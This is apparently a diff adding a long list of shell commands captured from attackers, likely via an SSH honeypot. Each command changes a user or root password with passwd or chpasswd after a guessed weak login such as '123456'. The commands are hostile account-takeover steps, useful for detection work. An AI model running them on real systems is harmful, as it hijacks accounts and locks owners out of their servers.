+echo -e "jana\nvgESwy0pWiGl\nvgESwy0pWiGl"|passwd|bash
+echo -e "svncode\n3iajUiYM7NR9\n3iajUiYM7NR9"|passwd|bash
+echo "root:3iajUiYM7NR9"|chpasswd|bash
+echo "123456\n3iajUiYM7NR9\n3iajUiYM7NR9\n"|passwd
+echo "123456\nfECykAjE9iae\nfECykAjE9iae\n"|passwd
+echo "celery\nYjXMsBxTpDvV\nYjXMsBxTpDvV\n"|passwd
+echo -e "mysql@123\nZxxT9FocXy9j\nZxxT9FocXy9j"|passwd|bash
+echo -e "123456\nZxxT9FocXy9j\nZxxT9FocXy9j"|passwd|bash
+echo "presto\nDddBNqAnfcDb\nDddBNqAnfcDb\n"|passwd
+echo "123456\n2xmNoWLJ3wIr\n2xmNoWLJ3wIr\n"|passwd
+echo -e "renatav\ne5nBNrNkCTVJ\ne5nBNrNkCTVJ"|passwd|bash
+echo -e "123456\nmIa9vZAxQhuU\nmIa9vZAxQhuU"|passwd|bash
+echo -e "1234\nZoK3BLP1HSXh\nZoK3BLP1HSXh"|passwd|bash
+echo -e "dbmaker\n2X2KL5fwjrqF\n2X2KL5fwjrqF"|passwd|bash
+echo -e "mysql@123\nq300zt4ipIwE\nq300zt4ipIwE"|passwd|bash
+echo -e "dbmaker\nq300zt4ipIwE\nq300zt4ipIwE"|passwd|bash
+echo -e "nuwanthi\nM5TuyeAc0J96\nM5TuyeAc0J96"|passwd|bash
+echo "test\nM5TuyeAc0J96\nM5TuyeAc0J96\n"|passwd
+echo "jbquilla\n3iajUiYM7NR9\n3iajUiYM7NR9\n"|passwd
+echo "jana\nvgESwy0pWiGl\nvgESwy0pWiGl\n"|passwd
+echo "svncode\n3iajUiYM7NR9\n3iajUiYM7NR9\n"|passwd
+echo -e "roy123\neNTfsLQqpLH5\neNTfsLQqpLH5"|passwd|bash
+echo "root:q300zt4ipIwE"|chpasswd|bash
+echo "mysql@123\nZxxT9FocXy9j\nZxxT9FocXy9j\n"|passwd
+echo "123456\nZxxT9FocXy9j\nZxxT9FocXy9j\n"|passwd
+echo "root:fhnLxF3qnPnG"|chpasswd|bash
+echo "renatav\ne5nBNrNkCTVJ\ne5nBNrNkCTVJ\n"|passwd
+echo "123456\nmIa9vZAxQhuU\nmIa9vZAxQhuU\n"|passwd
+echo "1234\nZoK3BLP1HSXh\nZoK3BLP1HSXh\n"|passwd
+echo "dbmaker\n2X2KL5fwjrqF\n2X2KL5fwjrqF\n"|passwd
+echo "mysql@123\nq300zt4ipIwE\nq300zt4ipIwE\n"|passwd
+echo "dbmaker\nq300zt4ipIwE\nq300zt4ipIwE\n"|passwd
+echo "nuwanthi\nM5TuyeAc0J96\nM5TuyeAc0J96\n"|passwd
+echo "roy123\neNTfsLQqpLH5\neNTfsLQqpLH5\n"|passwd
+echo "root:faSC6pu8Li82"|chpasswd|bash
+echo -e "nuwanthi\n4vXQT3CLPmWX\n4vXQT3CLPmWX"|passwd|bash
+echo "root:4vXQT3CLPmWX"|chpasswd|bash
+echo "root:eOG03CzNuSe2"|chpasswd|bash
+echo -e "mysql@123\n4vXQT3CLPmWX\n4vXQT3CLPmWX"|passwd|bash
+echo -e "123456\nmgUJO00YhMTj\nmgUJO00YhMTj"|passwd|bash
+echo -e "ctejedor\nmgUJO00YhMTj\nmgUJO00YhMTj"|passwd|bash
+echo -e "jobsilense\nmgUJO00YhMTj\nmgUJO00YhMTj"|passwd|bash
+echo -e "dbmaker\n4vXQT3CLPmWX\n4vXQT3CLPmWX"|passwd|bash
+echo -e "password\njUgbT0bvKOUK\njUgbT0bvKOUK"|passwd|bash
+echo "nuwanthi\n4vXQT3CLPmWX\n4vXQT3CLPmWX\n"|passwd
+echo "mysql@123\n4vXQT3CLPmWX\n4vXQT3CLPmWX\n"|passwd
+echo -e "123456\np0zcE2n2FAt2\np0zcE2n2FAt2"|passwd|bash
+echo -e "presto\nsVLYNIPkeyAI\nsVLYNIPkeyAI"|passwd|bash
+echo -e "123\nsVLYNIPkeyAI\nsVLYNIPkeyAI"|passwd|bash
+echo "123456\nmgUJO00YhMTj\nmgUJO00YhMTj\n"|passwd
+echo "ctejedor\nmgUJO00YhMTj\nmgUJO00YhMTj\n"|passwd
+echo "jobsilense\nmgUJO00YhMTj\nmgUJO00YhMTj\n"|passwd
+echo "dbmaker\n4vXQT3CLPmWX\n4vXQT3CLPmWX\n"|passwd
+echo "root:ut9BnINm21rn"|chpasswd|bash
+echo -e "123456\nsVLYNIPkeyAI\nsVLYNIPkeyAI"|passwd|bash
+echo "123456\np0zcE2n2FAt2\np0zcE2n2FAt2\n"|passwd
+echo "password\njUgbT0bvKOUK\njUgbT0bvKOUK\n"|passwd
+echo -e "password\nsVLYNIPkeyAI\nsVLYNIPkeyAI"|passwd|bash
+echo "root:sVLYNIPkeyAI"|chpasswd|bash
+echo -e "haha\nbR9JdMNUIVT9\nbR9JdMNUIVT9"|passwd|bash
+echo "presto\nsVLYNIPkeyAI\nsVLYNIPkeyAI\n"|passwd
+echo "123\nsVLYNIPkeyAI\nsVLYNIPkeyAI\n"|passwd
+echo -e "123456\nrKWaYDGYQEvk\nrKWaYDGYQEvk"|passwd|bash
+echo -e "password\nHEiT8cg2cCYT\nHEiT8cg2cCYT"|passwd|bash
+echo -e "raquel\nHEiT8cg2cCYT\nHEiT8cg2cCYT"|passwd|bash
+echo -e "presto\nNkIcRtn7Vwfn\nNkIcRtn7Vwfn"|passwd|bash
+echo -e "6\nszNKOR16kalp\nszNKOR16kalp"|passwd|bash
+echo -e "wirat\n2bwGBgaMq2KJ\n2bwGBgaMq2KJ"|passwd|bash
+echo "password\nsVLYNIPkeyAI\nsVLYNIPkeyAI\n"|passwd
+echo "haha\nbR9JdMNUIVT9\nbR9JdMNUIVT9\n"|passwd
+echo -e "mysql123\nAtLO8j0MWsJ8\nAtLO8j0MWsJ8"|passwd|bash
+echo "123456\nsVLYNIPkeyAI\nsVLYNIPkeyAI\n"|passwd
+echo "root:i45KVF2cnq7r"|chpasswd|bash
+echo -e "jeus\ni45KVF2cnq7r\ni45KVF2cnq7r"|passwd|bash
+echo -e "renatav\nAtLO8j0MWsJ8\nAtLO8j0MWsJ8"|passwd|bash
+echo "123456\nrKWaYDGYQEvk\nrKWaYDGYQEvk\n"|passwd
+echo "password\nHEiT8cg2cCYT\nHEiT8cg2cCYT\n"|passwd
+echo "raquel\nHEiT8cg2cCYT\nHEiT8cg2cCYT\n"|passwd
+echo -e "reu\n2bwGBgaMq2KJ\n2bwGBgaMq2KJ"|passwd|bash
+echo "presto\nNkIcRtn7Vwfn\nNkIcRtn7Vwfn\n"|passwd
+echo -e "mikem\nBfpgnjjlsM3O\nBfpgnjjlsM3O"|passwd|bash
+echo -e "123456\nBfpgnjjlsM3O\nBfpgnjjlsM3O"|passwd|bash
+echo -e "encargados\nBfpgnjjlsM3O\nBfpgnjjlsM3O"|passwd|bash
+echo -e "anypass\nzLPxhgiDwnHL\nzLPxhgiDwnHL"|passwd|bash
+echo -e "ali123\nzLPxhgiDwnHL\nzLPxhgiDwnHL"|passwd|bash
+echo -e "wirat\nvNQa1PNKlaxq\nvNQa1PNKlaxq"|passwd|bash
+echo "wirat\n2bwGBgaMq2KJ\n2bwGBgaMq2KJ\n"|passwd
+echo "mysql123\nAtLO8j0MWsJ8\nAtLO8j0MWsJ8\n"|passwd
+echo "jeus\ni45KVF2cnq7r\ni45KVF2cnq7r\n"|passwd
+echo "renatav\nAtLO8j0MWsJ8\nAtLO8j0MWsJ8\n"|passwd
+echo -e "123456\nCCGNlGV39rm5\nCCGNlGV39rm5"|passwd|bash
+echo -e "andreas\nCCGNlGV39rm5\nCCGNlGV39rm5"|passwd|bash
+echo -e "sandesh\nvNQa1PNKlaxq\nvNQa1PNKlaxq"|passwd|bash
+echo -e "mysql@123\nvNQa1PNKlaxq\nvNQa1PNKlaxq"|passwd|bash
+echo "6\nszNKOR16kalp\nszNKOR16kalp\n"|passwd
+echo "mikem\nBfpgnjjlsM3O\nBfpgnjjlsM3O\n"|passwd
+echo "123456\nBfpgnjjlsM3O\nBfpgnjjlsM3O\n"|passwd
+echo "encargados\nBfpgnjjlsM3O\nBfpgnjjlsM3O\n"|passwd
+echo "anypass\nzLPxhgiDwnHL\nzLPxhgiDwnHL\n"|passwd
+echo "ali123\nzLPxhgiDwnHL\nzLPxhgiDwnHL\n"|passwd
+echo "wirat\nvNQa1PNKlaxq\nvNQa1PNKlaxq\n"|passwd
+echo -e "Lalo\nLY8LC8fXI2Rv\nLY8LC8fXI2Rv"|passwd|bash
+echo "reu\n2bwGBgaMq2KJ\n2bwGBgaMq2KJ\n"|passwd
+echo "123456\nCCGNlGV39rm5\nCCGNlGV39rm5\n"|passwd
+echo "andreas\nCCGNlGV39rm5\nCCGNlGV39rm5\n"|passwd
+echo -e "frances123\nKcbnKu56SnJJ\nKcbnKu56SnJJ"|passwd|bash
+echo "root:KcbnKu56SnJJ"|chpasswd|bash
+echo -e "123456\nKcbnKu56SnJJ\nKcbnKu56SnJJ"|passwd|bash
+echo "sandesh\nvNQa1PNKlaxq\nvNQa1PNKlaxq\n"|passwd
+echo "mysql@123\nvNQa1PNKlaxq\nvNQa1PNKlaxq\n"|passwd
+echo "Lalo\nLY8LC8fXI2Rv\nLY8LC8fXI2Rv\n"|passwd
+echo "frances123\nKcbnKu56SnJJ\nKcbnKu56SnJJ\n"|passwd
+echo "123456\nKcbnKu56SnJJ\nKcbnKu56SnJJ\n"|passwd
+echo -e "andreas\npXJVsg7tMQst\npXJVsg7tMQst"|passwd|bash
+echo -e "python2\ne1Jv3jo9Xllt\ne1Jv3jo9Xllt"|passwd|bash
+echo -e "ubntubnt\ne1Jv3jo9Xllt\ne1Jv3jo9Xllt"|passwd|bash
+echo -e "reklame\ndTqbQRHhXEdi\ndTqbQRHhXEdi"|passwd|bash
+echo "andreas\npXJVsg7tMQst\npXJVsg7tMQst\n"|passwd
+echo "python2\ne1Jv3jo9Xllt\ne1Jv3jo9Xllt\n"|passwd
+echo "ubntubnt\ne1Jv3jo9Xllt\ne1Jv3jo9Xllt\n"|passwd
+echo "reklame\ndTqbQRHhXEdi\ndTqbQRHhXEdi\n"|passwd
+echo -e "doule\n8TIqZdzSQwzI\n8TIqZdzSQwzI"|passwd|bash
+echo -e "lwxat445405\nEwyc7yaDbHfq\nEwyc7yaDbHfq"|passwd|bash
+echo -e "wangyifa\nXhf6rpkVXC2F\nXhf6rpkVXC2F"|passwd|bash
+echo -e "andreas\njJLUrApBUB6T\njJLUrApBUB6T"|passwd|bash
+echo -e "tec\nr8Ler5peW65I\nr8Ler5peW65I"|passwd|bash
+echo -e "taoyao\nCiye3HGRqSKc\nCiye3HGRqSKc"|passwd|bash
+echo -e "cgw\nRZ3tqb4hglGt\nRZ3tqb4hglGt"|passwd|bash
+echo "doule\n8TIqZdzSQwzI\n8TIqZdzSQwzI\n"|passwd
+echo "lwxat445405\nEwyc7yaDbHfq\nEwyc7yaDbHfq\n"|passwd
+echo "wangyifa\nXhf6rpkVXC2F\nXhf6rpkVXC2F\n"|passwd
+echo -e "wirat\nkJCBb7gmGDWu\nkJCBb7gmGDWu"|passwd|bash
+echo -e "huyhq\neYjnSNxwvn0a\neYjnSNxwvn0a"|passwd|bash
+echo "andreas\njJLUrApBUB6T\njJLUrApBUB6T\n"|passwd
+echo "tec\nr8Ler5peW65I\nr8Ler5peW65I\n"|passwd
+echo "taoyao\nCiye3HGRqSKc\nCiye3HGRqSKc\n"|passwd
+echo "cgw\nRZ3tqb4hglGt\nRZ3tqb4hglGt\n"|passwd
+echo -e "mysql@123\n2pKgu6yufneU\n2pKgu6yufneU"|passwd|bash
+echo -e "celery\n2pKgu6yufneU\n2pKgu6yufneU"|passwd|bash
+echo -e "123456\n2pKgu6yufneU\n2pKgu6yufneU"|passwd|bash
+echo -e "mysql@123\n1jWBZjzTIVmT\n1jWBZjzTIVmT"|passwd|bash
+echo -e "12345678\n1jWBZjzTIVmT\n1jWBZjzTIVmT"|passwd|bash
+echo -e "wirat\n1jWBZjzTIVmT\n1jWBZjzTIVmT"|passwd|bash
+echo -e "marcob\njorumljxbDz1\njorumljxbDz1"|passwd|bash
+echo -e "kruwaraporn\njorumljxbDz1\njorumljxbDz1"|passwd|bash
+echo -e "taoyao\njorumljxbDz1\njorumljxbDz1"|passwd|bash
+echo -e "simon123\nRIharqhdF97C\nRIharqhdF97C"|passwd|bash
+echo -e "iakovidis\nRIharqhdF97C\nRIharqhdF97C"|passwd|bash
+echo -e "dbmaker\nLJb47VewUdb6\nLJb47VewUdb6"|passwd|bash
+echo -e "guest10\njorumljxbDz1\njorumljxbDz1"|passwd|bash
+echo -e "huyhq\njorumljxbDz1\njorumljxbDz1"|passwd|bash
+echo "mysql@123\n2pKgu6yufneU\n2pKgu6yufneU\n"|passwd
+echo "celery\n2pKgu6yufneU\n2pKgu6yufneU\n"|passwd
+echo "123456\n2pKgu6yufneU\n2pKgu6yufneU\n"|passwd
+echo -e "neeraj\nyCRO6you75x6\nyCRO6you75x6"|passwd|bash
+echo -e "123456\neYjnSNxwvn0a\neYjnSNxwvn0a"|passwd|bash
+echo -e "tmpftp\nTnkZnc0RhCL4\nTnkZnc0RhCL4"|passwd|bash
+echo -e "mysql@123\nMXztnRFFlAL1\nMXztnRFFlAL1"|passwd|bash
+echo "wirat\nkJCBb7gmGDWu\nkJCBb7gmGDWu\n"|passwd
+echo "huyhq\neYjnSNxwvn0a\neYjnSNxwvn0a\n"|passwd
+echo "marcob\njorumljxbDz1\njorumljxbDz1\n"|passwd
+echo "kruwaraporn\njorumljxbDz1\njorumljxbDz1\n"|passwd
+echo -e "mercaderista\neYjnSNxwvn0a\neYjnSNxwvn0a"|passwd|bash
+echo -e "celery\neYjnSNxwvn0a\neYjnSNxwvn0a"|passwd|bash
+echo -e "admin\neYjnSNxwvn0a\neYjnSNxwvn0a"|passwd|bash
+echo -e "test\nTnkZnc0RhCL4\nTnkZnc0RhCL4"|passwd|bash
+echo -e "123\neYjnSNxwvn0a\neYjnSNxwvn0a"|passwd|bash
+echo -e "wangyifa\nyCRO6you75x6\nyCRO6you75x6"|passwd|bash
+echo "mysql@123\n1jWBZjzTIVmT\n1jWBZjzTIVmT\n"|passwd
+echo -e "andreas\nMeKUqn5WumHP\nMeKUqn5WumHP"|passwd|bash
+echo -e "iakovidis\nyCRO6you75x6\nyCRO6you75x6"|passwd|bash
+echo "12345678\n1jWBZjzTIVmT\n1jWBZjzTIVmT\n"|passwd
+echo "wirat\n1jWBZjzTIVmT\n1jWBZjzTIVmT\n"|passwd
+echo -e "taoyao\neYjnSNxwvn0a\neYjnSNxwvn0a"|passwd|bash
+echo -e "P@ssword\nOQcbEXKGlvcp\nOQcbEXKGlvcp"|passwd|bash
+echo "taoyao\njorumljxbDz1\njorumljxbDz1\n"|passwd
+echo "guest10\njorumljxbDz1\njorumljxbDz1\n"|passwd
+echo "huyhq\njorumljxbDz1\njorumljxbDz1\n"|passwd
+echo "simon123\nRIharqhdF97C\nRIharqhdF97C\n"|passwd
+echo "iakovidis\nRIharqhdF97C\nRIharqhdF97C\n"|passwd
+echo "dbmaker\nLJb47VewUdb6\nLJb47VewUdb6\n"|passwd
+echo "neeraj\nyCRO6you75x6\nyCRO6you75x6\n"|passwd
+echo "123456\neYjnSNxwvn0a\neYjnSNxwvn0a\n"|passwd
+echo "tmpftp\nTnkZnc0RhCL4\nTnkZnc0RhCL4\n"|passwd
+echo -e "presto\n1CoaP3mbu70M\n1CoaP3mbu70M"|passwd|bash
+echo "mercaderista\neYjnSNxwvn0a\neYjnSNxwvn0a\n"|passwd
+echo "celery\neYjnSNxwvn0a\neYjnSNxwvn0a\n"|passwd
+echo "admin\neYjnSNxwvn0a\neYjnSNxwvn0a\n"|passwd
+echo "test\nTnkZnc0RhCL4\nTnkZnc0RhCL4\n"|passwd
+echo "123\neYjnSNxwvn0a\neYjnSNxwvn0a\n"|passwd
+echo "wangyifa\nyCRO6you75x6\nyCRO6you75x6\n"|passwd
+echo "andreas\nMeKUqn5WumHP\nMeKUqn5WumHP\n"|passwd
+echo "iakovidis\nyCRO6you75x6\nyCRO6you75x6\n"|passwd
+echo "taoyao\neYjnSNxwvn0a\neYjnSNxwvn0a\n"|passwd
+echo "mysql@123\nMXztnRFFlAL1\nMXztnRFFlAL1\n"|passwd
+echo "P@ssword\nOQcbEXKGlvcp\nOQcbEXKGlvcp\n"|passwd
+echo "presto\n1CoaP3mbu70M\n1CoaP3mbu70M\n"|passwd
+echo -e "xing\ns6Rg6gz0mrsO\ns6Rg6gz0mrsO"|passwd|bash
+echo -e "kruwaraporn\ns6Rg6gz0mrsO\ns6Rg6gz0mrsO"|passwd|bash
+echo -e "presto\nnJHBDvp4wPjh\nnJHBDvp4wPjh"|passwd|bash
+echo "xing\ns6Rg6gz0mrsO\ns6Rg6gz0mrsO\n"|passwd
+echo -e "1\nmmVf0buVYvwS\nmmVf0buVYvwS"|passwd|bash
+echo -e "xing\nmmVf0buVYvwS\nmmVf0buVYvwS"|passwd|bash
+echo -e "mari\nmmVf0buVYvwS\nmmVf0buVYvwS"|passwd|bash
+echo -e "1234\nKeRTKlT3vKEy\nKeRTKlT3vKEy"|passwd|bash
+echo "kruwaraporn\ns6Rg6gz0mrsO\ns6Rg6gz0mrsO\n"|passwd
+echo -e "mikem\nETWNV5LoPkxh\nETWNV5LoPkxh"|passwd|bash
+echo "root:ETWNV5LoPkxh"|chpasswd|bash
+echo -e "tanw\nETWNV5LoPkxh\nETWNV5LoPkxh"|passwd|bash
+echo "presto\nnJHBDvp4wPjh\nnJHBDvp4wPjh\n"|passwd
+echo -e "123\nsxhgeuKH3q9d\nsxhgeuKH3q9d"|passwd|bash
+echo "1\nmmVf0buVYvwS\nmmVf0buVYvwS\n"|passwd
+echo "xing\nmmVf0buVYvwS\nmmVf0buVYvwS\n"|passwd
+echo "mari\nmmVf0buVYvwS\nmmVf0buVYvwS\n"|passwd
+echo "1234\nKeRTKlT3vKEy\nKeRTKlT3vKEy\n"|passwd
+echo "root:ePmhpmdd6itJ"|chpasswd|bash
+echo -e "huyhq\nQ9o8atwKFvGb\nQ9o8atwKFvGb"|passwd|bash
+echo -e "123456\nePmhpmdd6itJ\nePmhpmdd6itJ"|passwd|bash
+echo -e "andreas\nePmhpmdd6itJ\nePmhpmdd6itJ"|passwd|bash
+echo -e "mikem\nePmhpmdd6itJ\nePmhpmdd6itJ"|passwd|bash
+echo -e "andreas\nkLEH5ZDuJNYM\nkLEH5ZDuJNYM"|passwd|bash
+echo -e "fabi\n52K3yQJwGYS6\n52K3yQJwGYS6"|passwd|bash
+echo -e "anita123\nX2dOYNUSQvTT\nX2dOYNUSQvTT"|passwd|bash
+echo "mikem\nETWNV5LoPkxh\nETWNV5LoPkxh\n"|passwd
+echo "tanw\nETWNV5LoPkxh\nETWNV5LoPkxh\n"|passwd
+echo -e "1234567\nnw4gfPNpSZ56\nnw4gfPNpSZ56"|passwd|bash
+echo -e "123\nu3nYgOsdeHRT\nu3nYgOsdeHRT"|passwd|bash
+echo -e "interview\nu3nYgOsdeHRT\nu3nYgOsdeHRT"|passwd|bash
+echo -e "presto\nu3nYgOsdeHRT\nu3nYgOsdeHRT"|passwd|bash
+echo -e "123456\nBOwx3PJdtkfe\nBOwx3PJdtkfe"|passwd|bash
+echo -e "1234\nu3nYgOsdeHRT\nu3nYgOsdeHRT"|passwd|bash
+echo -e "tanw\nu3nYgOsdeHRT\nu3nYgOsdeHRT"|passwd|bash
+echo -e "bodega\nGhT1VMqv0HPE\nGhT1VMqv0HPE"|passwd|bash
+echo -e "jenkins12345\nu3nYgOsdeHRT\nu3nYgOsdeHRT"|passwd|bash
+echo -e "toor\nu3nYgOsdeHRT\nu3nYgOsdeHRT"|passwd|bash
+echo -e "sdk\n52K3yQJwGYS6\n52K3yQJwGYS6"|passwd|bash
+echo "123\nsxhgeuKH3q9d\nsxhgeuKH3q9d\n"|passwd
+echo -e "xing\nmLfTM7C1M9wd\nmLfTM7C1M9wd"|passwd|bash
+echo -e "uat\nmLfTM7C1M9wd\nmLfTM7C1M9wd"|passwd|bash
+echo "huyhq\nQ9o8atwKFvGb\nQ9o8atwKFvGb\n"|passwd
+echo "123456\nePmhpmdd6itJ\nePmhpmdd6itJ\n"|passwd
+echo "andreas\nePmhpmdd6itJ\nePmhpmdd6itJ\n"|passwd
+echo "mikem\nePmhpmdd6itJ\nePmhpmdd6itJ\n"|passwd
+echo "andreas\nkLEH5ZDuJNYM\nkLEH5ZDuJNYM\n"|passwd
+echo "fabi\n52K3yQJwGYS6\n52K3yQJwGYS6\n"|passwd
+echo "anita123\nX2dOYNUSQvTT\nX2dOYNUSQvTT\n"|passwd
+echo -e "marcob\nzDxRPtTeSAsu\nzDxRPtTeSAsu"|passwd|bash
+echo -e "1234567890\n6CvZzHtTCFV4\n6CvZzHtTCFV4"|passwd|bash
+echo -e "123456\nClqpZYae5ZIz\nClqpZYae5ZIz"|passwd|bash
+echo -e "presto\nwOBi2gcko5pf\nwOBi2gcko5pf"|passwd|bash
+echo "1234567\nnw4gfPNpSZ56\nnw4gfPNpSZ56\n"|passwd
+echo "123\nu3nYgOsdeHRT\nu3nYgOsdeHRT\n"|passwd
+echo "interview\nu3nYgOsdeHRT\nu3nYgOsdeHRT\n"|passwd
+echo "presto\nu3nYgOsdeHRT\nu3nYgOsdeHRT\n"|passwd
+echo "123456\nBOwx3PJdtkfe\nBOwx3PJdtkfe\n"|passwd
+echo "1234\nu3nYgOsdeHRT\nu3nYgOsdeHRT\n"|passwd
+echo "tanw\nu3nYgOsdeHRT\nu3nYgOsdeHRT\n"|passwd
+echo "bodega\nGhT1VMqv0HPE\nGhT1VMqv0HPE\n"|passwd
+echo "jenkins12345\nu3nYgOsdeHRT\nu3nYgOsdeHRT\n"|passwd
+echo "toor\nu3nYgOsdeHRT\nu3nYgOsdeHRT\n"|passwd
+echo "sdk\n52K3yQJwGYS6\n52K3yQJwGYS6\n"|passwd
+echo -e "jeus\nClqpZYae5ZIz\nClqpZYae5ZIz"|passwd|bash
+echo -e "123456\nHrBcIZoqfYF7\nHrBcIZoqfYF7"|passwd|bash
+echo -e "presto\nClqpZYae5ZIz\nClqpZYae5ZIz"|passwd|bash
+echo -e "andreas\nClqpZYae5ZIz\nClqpZYae5ZIz"|passwd|bash
+echo -e "1234\nClqpZYae5ZIz\nClqpZYae5ZIz"|passwd|bash
+echo "xing\nmLfTM7C1M9wd\nmLfTM7C1M9wd\n"|passwd
+echo "uat\nmLfTM7C1M9wd\nmLfTM7C1M9wd\n"|passwd
+echo "marcob\nzDxRPtTeSAsu\nzDxRPtTeSAsu\n"|passwd
+echo "1234567890\n6CvZzHtTCFV4\n6CvZzHtTCFV4\n"|passwd
+echo "123456\nClqpZYae5ZIz\nClqpZYae5ZIz\n"|passwd
+echo "presto\nwOBi2gcko5pf\nwOBi2gcko5pf\n"|passwd
+echo -e "123456\nnoYozFFxsEpY\nnoYozFFxsEpY"|passwd|bash
+echo -e "encargados\nnoYozFFxsEpY\nnoYozFFxsEpY"|passwd|bash
+echo "jeus\nClqpZYae5ZIz\nClqpZYae5ZIz\n"|passwd
+echo "123456\nHrBcIZoqfYF7\nHrBcIZoqfYF7\n"|passwd
+echo "presto\nClqpZYae5ZIz\nClqpZYae5ZIz\n"|passwd
+echo "andreas\nClqpZYae5ZIz\nClqpZYae5ZIz\n"|passwd
+echo "1234\nClqpZYae5ZIz\nClqpZYae5ZIz\n"|passwd
+echo "123456\nnoYozFFxsEpY\nnoYozFFxsEpY\n"|passwd
+echo "encargados\nnoYozFFxsEpY\nnoYozFFxsEpY\n"|passwd
+echo -e "ali123\nA0IPhZiaYdsI\nA0IPhZiaYdsI"|passwd|bash
+echo -e "tpering\n7lEwCZSdDVlT\n7lEwCZSdDVlT"|passwd|bash
+echo "ali123\nA0IPhZiaYdsI\nA0IPhZiaYdsI\n"|passwd
+echo -e "git4321\n9yyVevmOszCp\n9yyVevmOszCp"|passwd|bash
+echo -e "presto\n9yyVevmOszCp\n9yyVevmOszCp"|passwd|bash
+echo -e "doule\nuaZ0oxndUVRV\nuaZ0oxndUVRV"|passwd|bash
+echo -e "celery\n9yyVevmOszCp\n9yyVevmOszCp"|passwd|bash
+echo -e "password\n3pD6Id2qPTcK\n3pD6Id2qPTcK"|passwd|bash
+echo -e "git21\nl11JO64anUsc\nl11JO64anUsc"|passwd|bash
+echo -e "wirat\nl11JO64anUsc\nl11JO64anUsc"|passwd|bash
+echo -e "encargados\nl11JO64anUsc\nl11JO64anUsc"|passwd|bash
+echo -e "fabi\nBN6f1KSph9ra\nBN6f1KSph9ra"|passwd|bash
+echo -e "tpering\nl11JO64anUsc\nl11JO64anUsc"|passwd|bash
+echo -e "celery\nl11JO64anUsc\nl11JO64anUsc"|passwd|bash
+echo -e "celery\nOhJ2HjXk8E6q\nOhJ2HjXk8E6q"|passwd|bash
+echo "tpering\n7lEwCZSdDVlT\n7lEwCZSdDVlT\n"|passwd
+echo -e "jobsilense\nJhZAgTVBZNtZ\nJhZAgTVBZNtZ"|passwd|bash
+echo -e "fabi\nJhZAgTVBZNtZ\nJhZAgTVBZNtZ"|passwd|bash
+echo -e "123456\nEStYQojLDoxP\nEStYQojLDoxP"|passwd|bash
+echo -e "tmpftp\nthiQ3Fh2FRWa\nthiQ3Fh2FRWa"|passwd|bash
+echo -e "simon123\nwuI2mhvbibel\nwuI2mhvbibel"|passwd|bash
+echo "git4321\n9yyVevmOszCp\n9yyVevmOszCp\n"|passwd
+echo "presto\n9yyVevmOszCp\n9yyVevmOszCp\n"|passwd
+echo "doule\nuaZ0oxndUVRV\nuaZ0oxndUVRV\n"|passwd
+echo "celery\n9yyVevmOszCp\n9yyVevmOszCp\n"|passwd
+echo "password\n3pD6Id2qPTcK\n3pD6Id2qPTcK\n"|passwd
+echo "git21\nl11JO64anUsc\nl11JO64anUsc\n"|passwd
+echo "wirat\nl11JO64anUsc\nl11JO64anUsc\n"|passwd
+echo "encargados\nl11JO64anUsc\nl11JO64anUsc\n"|passwd
+echo "fabi\nBN6f1KSph9ra\nBN6f1KSph9ra\n"|passwd
+echo "tpering\nl11JO64anUsc\nl11JO64anUsc\n"|passwd
+echo "celery\nl11JO64anUsc\nl11JO64anUsc\n"|passwd
+echo "celery\nOhJ2HjXk8E6q\nOhJ2HjXk8E6q\n"|passwd
+echo -e "ded\n4N8vVd3i1qYa\n4N8vVd3i1qYa"|passwd|bash
+echo -e "presto\nWAhejM5b0gFC\nWAhejM5b0gFC"|passwd|bash
+echo -e "franco\nWAhejM5b0gFC\nWAhejM5b0gFC"|passwd|bash
+echo -e "123456\n5j0sBLqOIfko\n5j0sBLqOIfko"|passwd|bash
+echo -e "123456789\n5EPXi0HLSLGx\n5EPXi0HLSLGx"|passwd|bash
+echo -e "taoyao\n4r8bJs2S6i8D\n4r8bJs2S6i8D"|passwd|bash
+echo -e "dbmaker\nPsxOUKWHUvMt\nPsxOUKWHUvMt"|passwd|bash
+echo -e "Lalo\ni0fZYVDibpnh\ni0fZYVDibpnh"|passwd|bash
+echo "root:wuI2mhvbibel"|chpasswd|bash
+echo -e "fms\ni0fZYVDibpnh\ni0fZYVDibpnh"|passwd|bash
+echo -e "iakovidis\nPsxOUKWHUvMt\nPsxOUKWHUvMt"|passwd|bash
+echo -e "jobsilense\nPsxOUKWHUvMt\nPsxOUKWHUvMt"|passwd|bash
+echo "jobsilense\nJhZAgTVBZNtZ\nJhZAgTVBZNtZ\n"|passwd
+echo "fabi\nJhZAgTVBZNtZ\nJhZAgTVBZNtZ\n"|passwd
+echo "root:Wwgxo4KuxYrN"|chpasswd|bash
+echo -e "123456\nOWwrHhGtKC55\nOWwrHhGtKC55"|passwd|bash
+echo "tmpftp\nthiQ3Fh2FRWa\nthiQ3Fh2FRWa\n"|passwd
+echo "root:CHJUQg1kC7rZ"|chpasswd|bash
+echo "root:zqxESjgMgCxe"|chpasswd|bash
+echo "123456\nEStYQojLDoxP\nEStYQojLDoxP\n"|passwd
+echo "simon123\nwuI2mhvbibel\nwuI2mhvbibel\n"|passwd
+echo "root:sCHpMNTDsMNS"|chpasswd|bash
+echo -e "mysql@123\nyfAaTnkedWP6\nyfAaTnkedWP6"|passwd|bash
+echo -e "1234\n6o0KdUxBcviq\n6o0KdUxBcviq"|passwd|bash
+echo "ded\n4N8vVd3i1qYa\n4N8vVd3i1qYa\n"|passwd
+echo "presto\nWAhejM5b0gFC\nWAhejM5b0gFC\n"|passwd
+echo "franco\nWAhejM5b0gFC\nWAhejM5b0gFC\n"|passwd
+echo "123456\n5j0sBLqOIfko\n5j0sBLqOIfko\n"|passwd
+echo "123456789\n5EPXi0HLSLGx\n5EPXi0HLSLGx\n"|passwd
+echo "taoyao\n4r8bJs2S6i8D\n4r8bJs2S6i8D\n"|passwd
+echo "dbmaker\nPsxOUKWHUvMt\nPsxOUKWHUvMt\n"|passwd
+echo "Lalo\ni0fZYVDibpnh\ni0fZYVDibpnh\n"|passwd
+echo "fms\ni0fZYVDibpnh\ni0fZYVDibpnh\n"|passwd
+echo "iakovidis\nPsxOUKWHUvMt\nPsxOUKWHUvMt\n"|passwd
+echo "jobsilense\nPsxOUKWHUvMt\nPsxOUKWHUvMt\n"|passwd
+echo -e "bounce\nMF5IS7UWwxgt\nMF5IS7UWwxgt"|passwd|bash
+echo -e "fms\n6TwPaswlKAqL\n6TwPaswlKAqL"|passwd|bash
+echo -e "huyhq\nEznKPKxLpB2z\nEznKPKxLpB2z"|passwd|bash
+echo "123456\nOWwrHhGtKC55\nOWwrHhGtKC55\n"|passwd
